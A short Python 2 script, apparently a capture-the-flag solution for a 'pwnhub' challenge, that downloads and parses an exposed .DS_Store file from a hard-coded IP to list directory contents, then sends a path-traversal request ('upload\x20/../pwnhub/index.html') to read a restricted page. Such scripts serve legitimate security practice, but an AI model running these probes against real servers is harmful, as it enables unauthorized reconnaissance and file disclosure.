#!/usr/bin/env python2
# coding=utf-8

import os
import sys
import cStringIO
import requests as req
from lib.ds_store import DSStore

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 99.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135",
}


def ds_(f):
    d = DSStore.open(f)
    dirs_files = set()
    for x in d.traverse():
        dirs_files.add(x.filename)
    d.close()
    print(dirs_files)


def main(u):
    res = req.get(url=u, headers=headers)
    # print res.text
    if res.status_code == 200:
        return res.content
    else:
        return False

if __name__ == '__main__':
    # print main('http://54.223.177.152/pwnhub /../.DS_Store')
    # ds_store_file = cStringIO.StringIO()
    # ds_store_file.write(
    #     main('http://54.223.177.152/.DS_Store'))
    # ds_(ds_store_file)
    # print main('http://54.223.177.152/upload\x20/../pwnhub/index.html')
    import urllib2
    _req = urllib2.Request(
        'http://54.223.177.152/upload\x20/../pwnhub/index.html')
    res = urllib2.urlopen(_req)
    print res.read()
    res.close()
